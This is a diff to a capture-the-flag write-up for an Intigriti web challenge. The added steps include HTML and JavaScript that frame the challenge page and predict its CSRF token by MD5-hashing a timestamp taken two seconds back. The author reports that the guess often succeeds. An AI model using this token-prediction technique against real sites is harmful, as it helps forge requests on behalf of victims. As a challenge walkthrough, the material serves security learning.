@@ -146,6 +146,29 @@ To bypass CSRF protection, we have to analyze the working or csrf token
 2. Hop over to the cyberchef to check that the csrf token is the md5 hash of the page generated timestamp ![image](https://user-images.githubusercontent.com/19681324/113497370-142ec180-9521-11eb-9dbd-90cedd7d9435.png)
 
 3. To bypass the csrf restriction, we have to guess the timestamp and generate a md5 hash of that to use as an token. Then we can submit the form with csrf token and payload created earlier. 
+4. The request reoughly takes 2 seconds to go to server and render the response. so to test that we used following html 
+```<!DOCTYPE html>html
+<html>
+  <head>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.16.0/js/md5.min.js"></script>
+   </head>
+  <body>
+    <iframe src="https://challenge-0321.intigriti.io/"  width="500" height="500"></iframe>
+   
+  </body>
+  <script>
+  var currentSecond = Math.floor(Date.now() / 1000);  // divide by 1000 is to convert to second
+  var myDate = new Date((currentSecond*1000)-2000); 
+   var d = Math.floor(Date.now() / 1000 )-2;  // taking time before 2 second
+  console.log(myDate.toGMTString());
+  console.log(md5(d));
+  </script>
+</html>
+```
+and got this result
+![image](https://user-images.githubusercontent.com/19681324/113504596-b917c180-9556-11eb-8d2d-070f1aaa3c33.png)
+5. this succecceded in guessing the time and as a result csrf token quite a number of time, but missed as well ( sometimes)
+
 
 
 
